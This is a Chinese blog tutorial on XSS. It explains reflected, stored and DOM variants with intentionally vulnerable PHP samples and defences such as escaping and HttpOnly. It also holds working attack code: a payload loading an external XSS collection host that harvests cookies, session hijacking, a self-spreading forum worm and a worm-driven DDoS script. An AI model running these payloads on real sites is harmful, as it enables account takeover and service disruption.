---
title: XSS跨站漏洞详解
date: 2018-09-05 11:34:31
tags:
	- XSS
	- 跨站脚本攻击
	- 漏洞
	- 渗透
categories: 渗透测试
keywords: 
description:
---
![](http://image.ixysec.com/image/xss/logo.jpg)
XSS漏洞的基础，一些利用方法，挖掘思路以及防范。<!-- more -->

XSS即跨站脚本攻击，发生在目标网站中目标用户的浏览器层面上，当用户浏览器渲染整个HTML文档的过程中出现了不被预期的脚本指令并执行时，XSS就会发生。

## XSS攻击产生原理
网站没有对用户输入数据进行编码，转义，过滤限制等处理。导致攻击者的输入可能被输出到页面中当作HTML代码和客户端脚本被浏览器执行，从而进行攻击。

例如一个搜索页面，搜索词GET传递，被输出到页面中。

![](http://image.ixysec.com/image/xss/xss001.png)

尝试将传递的参数修改为：
```
<h1>test</h1>
```
![](http://image.ixysec.com/image/xss/xss002.png)

![](http://image.ixysec.com/image/xss/xss003.png)

可以看到`test`样式被改变了，而在源码中我们输入的`h1`标签也被当作html代码解析了，不再是普通的字符串。

## XSS漏洞的分类
### 反射型XSS
反射型又是***非持久型***，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。 
通常，黑客先将恶意代码写好，然后将连接发给受害者，受害者只要点击就会出现攻击现象。

测试代码：
```
<?php
if(!isset($_GET['keywords'])){
	$keywords = "";
}else{
	$keywords = $_GET['keywords'];
}

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>反射性XSS</title>
</head>
<body>
	<form action="search.php" method="get">
		搜索：<input type="text" name="keywords"><br>
		<input type="submit" name="" value="搜索">
	</form>
	<hr>
	搜索“<?php echo $keywords?>”的内容：
</body>
</html>
```
代码中直接获取GET传递的值并且输出到页面中。
payload:
```
http://127.0.0.1/xss/search.php?keywords=<script>alert(/xss/)</script>
```
![](http://image.ixysec.com/image/xss/xss004.png)

可以看到我们输入的`<script>alert(/xss/)</script>`被成功执行了，只有访问这个攻击者组合的网址代码才会被执行。

注意：这里使用火狐浏览器进行测试，很多浏览器会自动拦截反射型XSS。

反射型XSS防御：
PHP中我们可以使用`htmlentities()`函数对接收的数据进行转义过滤。
修改上面的代码为：
```
<?php
if(!isset($_GET['keywords'])){
	$keywords = "";
}else{
	$keywords = htmlentities($_GET['keywords']);//接收时候进行过滤
}

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>反射性XSS</title>
</head>
<body>
	<form action="search.php" method="get">
		搜索：<input type="text" name="keywords"><br>
		<input type="submit" name="" value="搜索">
	</form>
	<hr>
	搜索“<?php echo $keywords?>”的内容：
</body>
</html>
```
我们再来访问试试

![](http://image.ixysec.com/image/xss/xss005.png)

![](http://image.ixysec.com/image/xss/xss006.png)

可以看到我们输入的内容被原样输出，没有执行，而在页面源代码中也可以看到，左右尖括号都被转换成了字符实体，这样浏览器在解析的时候就会当作一个普通字符进行显示，而不是html标签。

### 存储型XSS
存储型XSS是***持久型***的，也就是会把攻击代码存入数据库中，这样会导致只要数据不被删除，任何用户访问到输出恶意代码的页面代码就会被执行，例如，留言板、发帖等。。

下面以一个简单的留言板进行演示。

留言展示页面代码：
```
<?php
$mysqli = new mysqli("127.0.0.1", "root", "root", "liuyan");
$mysqli->query("set names 'utf8'");
$sql = "SELECT * from message";
$result = $mysqli->query($sql);
$result = $result->fetch_all(MYSQLI_ASSOC);
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>XSS留言板</title>
	<style type="text/css">
		* {
			margin: 0;
			padding: 0;
		}
		.top {
			margin: 50px auto;
			width: 800px;
		}
		.top textarea {
			width: 800px;
			height: 100px;
		}
		.top .btn {
			float: right;
		}
		.liuyan {
			width: 780px;
			margin: 0 auto;
			margin-top: 20px;
			border: 1px solid #aaa;
			padding: 10px;
		}
		.liuyan span {
			float: right;
			color: red;
		}
		.liuyan .content {
			margin-top: 10px;
		}
	</style>
</head>
<body>
	<div class="top">
		<form action="liuyan.php?act=do" method="post">
			<textarea name="content"></textarea>
			用户名：<input type="text" name="name">
			<input type="submit" name="" value="留言" class="btn">
		</form>
	</div>
	<?foreach($result as $row):?>
	<div class="liuyan">
		<p>用户名：<?php echo $row['name']?><span><?php echo $row['date']?></span></p>
		<p class="content"><?php echo $row['content']?></p>
	</div>
	<?endforeach;?>
</body>
</html>
```
留言提交处理代码：
```
<?php
if(isset($_GET['act'])){
	$mysqli = new mysqli("127.0.0.1", "root", "root", "liuyan");
	$mysqli->query("set names 'utf8'");
	$name = $_POST['name'];
	$content = $_POST['content'];
	$date = date('Y-m-d h:i:s', time());
	$sql = "INSERT INTO message(name,content,date) VALUES('{$name}','{$content}','{$date}')";
	if($mysqli->query($sql)){
		header("Location: ./index.php");
	}else{
		echo "失败";
	}
}
?>
```

展示页效果：

![](http://image.ixysec.com/image/xss/xss007.png)

上面代码中可以看到，留言全部被存到数据库中，在展示页中被显示出来。中间没有做任何过滤。

![](http://image.ixysec.com/image/xss/xss008.png)

我们将留言内容填上我们的XSS代码，然后点击留言，在用户名处也可以，只要被正常输出执行。

![](http://image.ixysec.com/image/xss/xss009.png)

代码被成功执行，我们看下数据库中。
![](http://image.ixysec.com/image/xss/xss010.png)

攻击代码被存放到数据库中，并且在留言展示页中被输出，所以任何用户每访问一次代码就会自动执行一次。

![](http://image.ixysec.com/image/xss/xss011.gif)

存储型XSS防御：
可以选择在存放到数据库的时候和输出到页面的时候对数据进行过滤转义。

### DOM型XSS
DOM型与前两者的差别是，只在客户端进行解析，客户端语言操作DOM元素时触发的XSS。

测试代码：
```
<?php
error_reporting(0);
$name = htmlentities($_GET['name']);
// $name = $_GET['name'];
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>DOM型XSS</title>
	<script type="text/javascript" src="js/jquery-1.12.4.min.js"></script>
</head>
<body>
	<input type="text" name="" id="username" value="<?php echo $name?>">
	<button id="ok">确定</button>
	<div id="content"></div>
	<script type="text/javascript">
		//获取到id等于username的元素
		var username = $("#username");
		//点击确定按钮后，把内容复制到content当中
		$("#ok").click(function(){
			var content = $("#content");
			content.append(username.attr('value'));
		})
	</script>
</body>
</html>
```
代码中获取GET参数输出到input的value中，但是进行了字符实体转义，不会产生XSS。

![](http://image.ixysec.com/image/xss/xss012.png)

![](http://image.ixysec.com/image/xss/xss013.png)

但是当我们点击确定按钮之后，代码却被执行了：

![](http://image.ixysec.com/image/xss/xss014.gif)

虽然服务端脚本语言在接收参数时对数据进行了转义，但是网站中可能会有一些功能直接获取DOM元素的内容进行输出，这时获取到的内容是正常的字符串，并不是字符实体，所以在输出时，代码又会被正常解析执行从而产生了XSS攻击。

DOM型XSS防御：
如果前端可能会进行DOM操作的话，可以在后端接收数据时利用一些函数直接将html标签过滤成空，这样前端在使用时候也不会被当作代码执行了。

## XSS漏洞挖掘
### 黑盒手工挖掘漏洞及绕过技巧
尽可能找到一切用户可控并且能够输出在页面代码中的地方。

下面用一个简易的论坛程序进行测试。

![](http://image.ixysec.com/image/xss/xss015.png)

看到有发帖的功能，浏览器设置上代理，打开Burp Suite，先不拦截数据包，正常发一贴看看。Burp Suite软件使用在这里不多讲解，自行学习。

![](http://image.ixysec.com/image/xss/xss016.png)

点击发表，然后进入帖子详情页。

![](http://image.ixysec.com/image/xss/xss017.png)

在页面源代码中也能看到，尖括号被转义成字符实体了，在看不到后端代码的情况下，我们猜想是不是数据在传递到后端之前，编辑器在前端进行了一次转义，大多数富文本编辑器都有这个功能。

我们在Burp的纪录中找到刚刚发帖的POST包

![](http://image.ixysec.com/image/xss/xss018.png)

可以看到在request请求中我们发送的数据就已经被转义了，右键讲数据包发送到重放功能。

修改content参数的值，然后发送数据包。

![](http://image.ixysec.com/image/xss/xss019.png)

这样就可以绕过前端js代码的过滤，直接将数据发送到后端脚本文件进行处理。我们进入详情页看看。

![](http://image.ixysec.com/image/xss/xss020.png)

代码被成功执行，这是后端代码没有进行过滤的情况。

我们再看看个人资料页，点击发帖人的头像

![](http://image.ixysec.com/image/xss/xss021.png)

看到只有名字是我们可以控制修改的，可以尝试在名字这里进行XSS。

![](http://image.ixysec.com/image/xss/xss022.png)

修改之后再次进入个人主页。

![](http://image.ixysec.com/image/xss/xss023.png)

代码已经被执行了。

一般后台也都有管理用户的功能，会不会攻击到后台管理员呢，我们登陆后台看看。

![](http://image.ixysec.com/image/xss/xss024.png)

![](http://image.ixysec.com/image/xss/xss025.png)

代码并没有执行，但是从源代码中看到标签也没有被转义成字符实体，这是因为代码被包含在input标签的value属性中，这时我们需要闭合双引号和标签。

重新修改姓名

![](http://image.ixysec.com/image/xss/xss026.png)

![](http://image.ixysec.com/image/xss/xss027.png)

代码没有正常执行，数据库限制了内容长度，标签后面没有正常闭合，修改下代码。

![](http://image.ixysec.com/image/xss/xss028.png)

这时在后台进入用户信息编辑页面

![](http://image.ixysec.com/image/xss/xss029.png)

代码被成功执行。
上面讲解的是黑盒手工挖掘的一些思路和绕过小技巧，也可以使用一些漏洞扫描工具进行检测，工具的使用这里就不详细讲了。

### 代码审计挖掘XSS漏洞
关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。

PHP中常见的接收参数的方式有`$_GET`、`$_POST`、`$_REQUEST`等等，可以搜索所有接收参数的地方。

![](http://image.ixysec.com/image/xss/xss030.png)

然后对接收到的数据进行跟踪，看看有没有输出到页面中，输出到页面中且没有进行过滤的可能就会产生XSS漏洞。

![](http://image.ixysec.com/image/xss/xss031.png)

也可以搜索类似`echo`这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。

大多数程序会对接受参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过等等。

同理审计DOM型注入可以搜索一些js操作DOM元素的关键词进行审计。

代码审计简单就讲这些，以后有机会单独出代码审计系列的文章。

## XSS漏洞利用方式
上面讲解了XSS的分类及一些简单的测试挖掘XSS的方法，那么XSS究竟能做些什么呢，下面介绍几种常见的XSS利用方式。

### XSS平台
XSS平台是用来在线管理测试XSS漏洞的，我搭建的XSS平台地址：http://xo0.cc

![](http://image.ixysec.com/image/xss/xss032.png)

可以创建不同的项目管理存在XSS的站点。在配置中选择不同的模块，一般选择默认的就够用。

![](http://image.ixysec.com/image/xss/xss033.png)

然后可以在项目代码中看到项目的XSS地址和代码，只要页面加载了这个地址，相应的代码就会被执行。

![](http://image.ixysec.com/image/xss/xss034.png)

### COOKIE获取

我们发个帖测试一下，帖子内容修改为：
```
<sCRiPt/SrC=//xo0.cc/gHnd>
```
![](http://image.ixysec.com/image/xss/xss035.png)

然后我们打开帖子详情页

![](http://image.ixysec.com/image/xss/xss036.png)

网络中我们可以看到，页面加载了我们插入的地址。同时XSS平台也收到了信息，包含来源地址，COOKIE，浏览器信息、ip地址等等。

![](http://image.ixysec.com/image/xss/xss037.png)

程序员可以在代码中设置COOKIE的时候将HTTPONLY属性设置为TRUE就可以防止COOKIE被获取。

### 会话劫持

我们获取COOKIE是为了伪造登陆信息，从而在不知道账号密码的情况下登陆用户或管理员的账户。

打开一个未登录的浏览器，将COOKIE的值替换成我们获取到的COOKIE进行访问，刷新页面就可以看到我们已经是登陆状态了。

![](http://image.ixysec.com/image/xss/xss038.gif)

### XSS蠕虫

蠕虫病毒的传染性是一传二、二传四......而且被感染后的同时自己也作为感染源继续发布恶意代码感染其他人。

下面我们还是用这个论坛程序进行演示。

经过测试，可以使用GET传递参数进行发帖
```
http://xss.localhost/home/_fatie.php?bk=5&zt=0&content=333&title=<sCRiPt sRC=http://xo0.cc/gHnd></sCrIpT>
```
只需访问上面的连接就可以发表一篇标题为`<sCRiPt sRC=http://xo0.cc/gHnd></sCrIpT>`的帖子，这样在帖子列表页我们的XSS代码就会被执行。

我们修改XSS平台项目的代码，添加蠕虫代码

![](http://image.ixysec.com/image/xss/xss039.png)

```
var strrand = +new Date();//获取当前时间
var str = 'http://xss.localhost/home/_fatie.php?bk=5&zt=0&content=333&title=<sCRiPt sRC=http://xo0.cc/gHnd?123456'+strrand+'></sCrIpT>';//组合发帖的链接，拼接当前时间是为了防止浏览器访问同一资源使用的是缓存而不是真正去访问

var tag = document.createElement('img');//创建一个img标签元素
tag.src = str;//将这个元素的src属性设置为上面的发帖地址
document.body.append(tag.src);//将这个元素添加到html文档中
```
现在我们发表一篇标题为`<sCRiPt sRC=http://xo0.cc/gHnd></sCrIpT>`的帖子，然后访问帖子列表页

![](http://image.ixysec.com/image/xss/xss040.png)

可以看到访问了XSS平台的地址，而且我们修改过的代码也成功执行了，加载了发帖的链接。

此时列表页有2条帖子

![](http://image.ixysec.com/image/xss/xss041.png)

我们刷新看一下。

![](http://image.ixysec.com/image/xss/xss042.gif)

可以看到帖子数量成倍的增长，页面中有多少条帖子我们的代码就会被执行多少次，所有访问此页面的用户都会被感染然后自动发帖，这样就形成了XSS蠕虫。

防御XSS蠕虫：
可以在数据提交页面中提交随机生成的token在后台进行验证，如果验证不通过则发帖失败，这样就可以防止蠕虫病毒传播。

### DDOS攻击

想对某网站进行DDOS攻击需要结合XSS蠕虫使用可以发挥最大效果。

我们修改XSS平台项目代码

![](http://image.ixysec.com/image/xss/xss043.png)

```
var strrand = +new Date();
var str = 'http://xss.localhost/home/_fatie.php?bk=5&zt=0&content=333&title=<sCRiPt sRC=http://xo0.cc/gHnd?123456'+strrand+'></sCrIpT>';

var tag = document.createElement('img');
tag.src = str;
document.body.append(tag.src);
//--------------------------------------
//上面是蠕虫的代码，下面是DDOS攻击的代码
var myVar;//生明一个变量
function myFunction(){ //定义myFunction函数
	myVar = setInterval(alertFunc, 1000);//每一秒执行一次alertFunc这个函数
}
function alertFunc(){//定义alertFunc函数
	var strrand = +new Date();//获取当前时间
	var str = 'http://xss.localhost/'+strrand;//组合连接防止浏览器缓存，引号中的就是要进行DDOS攻击的网站
	
	var tag = document.createElement('img');//创建一个img元素
	tag.src = str;//将这个元素的src属性设置为上面组合的地址
	document.body.append(tag);//将这个元素添加到页面中
}

myFunction();//执行myFunction函数
```
上面的代码被执行一次产生的效果就是，发表一篇含有蠕虫病毒的帖子，然后每秒访问一次上面指定的网址。

我们来刷新一下帖子列表页看看。

![](http://image.ixysec.com/image/xss/xss044.gif)

可以看到不断的对目标网站发送请求，如果存在XSS漏洞的网站流量很大，蠕虫感染了成千上万的用户，每秒不停的对同一网站发送请求，很容易造成目标网站服务器崩溃。


XSS漏洞的利用奇淫技巧还有很多，比如知道后台账号密码但是找不到地址、XSS钓鱼、结合CSRF使用等等一些其他用法等你挖掘。

对文章有任何问题的欢迎联系作者。